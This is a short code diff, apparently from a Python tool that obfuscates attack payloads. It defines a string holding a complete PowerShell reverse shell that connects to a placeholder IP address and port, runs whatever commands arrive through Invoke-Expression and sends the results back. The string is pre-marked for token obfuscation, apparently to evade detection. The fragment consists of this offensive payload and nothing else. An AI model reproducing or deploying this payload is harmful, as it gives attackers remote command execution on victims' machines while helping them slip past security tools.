@@ -1,6 +1,7 @@
 import re
 import random
 import string
+import os
 
 # PAYLOAD AND PATTERN
 reverse_shell = """$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)();}$ReverseShellConnection.(/Close/)()"""
